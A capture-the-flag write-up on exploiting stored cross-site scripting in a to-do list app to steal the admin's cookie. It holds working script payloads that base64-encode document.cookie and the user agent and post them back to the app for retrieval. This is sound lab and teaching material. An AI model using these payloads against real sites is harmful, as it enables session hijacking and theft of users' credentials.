 # TODO

## Overview

The goal of this challenge is to retrieve a flag stored in the admin user’s cookies The TODO list application allows user input to be displayed without sanitization, making it vulnerable to Stored Cross-Site Scripting (XSS)

Stored XSS allows attackers to execute scripts in other users’ browsers, enabling theft of sensitive data like cookies


## Exploitation

### Test for XSS

Input:

```
<b>Test</b>
```

Result: Text rendered in bold → confirms HTML is not sanitized.

### Inspect Application Code
Use:
`Inspect → Sources → /static/app.js`

- The app.js file shows how the application handles user input
- It reveals that input is sent to the server and later displayed on the page
- It helps identify that there is no sanitization, making the XSS vulnerability possible

### Steal Admin Cookies
In lines 4-11 of app.js replace every instance of `value` with `document.cookie`
```
<script>
	fetch('/item', { 
		method : 'POST',
		headers : {
			'Content-Type' : 'application/json',},
		body : JSON.stringify({ item : btoa(document.cookie) }),
	}).then(console.log).catch(console.log);
</script>
```
send this whole code block through the form box on the webpage and refresh

### Get User Agent
In lines 4-11 of app.js replace every instance of `value` with `navigator.userAgent`

```
<script>
	fetch('/item', { 
		method : 'POST',
		headers : {
			'Content-Type' : 'application/json',},
		body : JSON.stringify({ item : btoa(navigator.userAgent) }),
	}).then(console.log).catch(console.log);
</script>
```
send this whole code block through the form box on the webpage and refresh
